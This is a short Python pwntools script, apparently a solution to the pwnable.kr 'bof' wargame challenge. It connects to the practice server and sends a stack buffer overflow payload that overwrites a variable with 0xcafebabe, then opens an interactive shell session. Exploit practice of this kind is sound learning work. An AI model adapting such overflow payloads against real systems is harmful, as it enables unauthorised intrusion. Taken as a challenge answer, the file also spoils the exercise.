from pwn import *
context.log_level = 'DEBUG'
# r = process('./bof')
r = remote('pwnable.kr',9000)

# raw_input("#")
# r.recvuntil(":")

r.sendline('a'*(0x2c+0x8)+p32(0xcafebabe))


r.interactive()
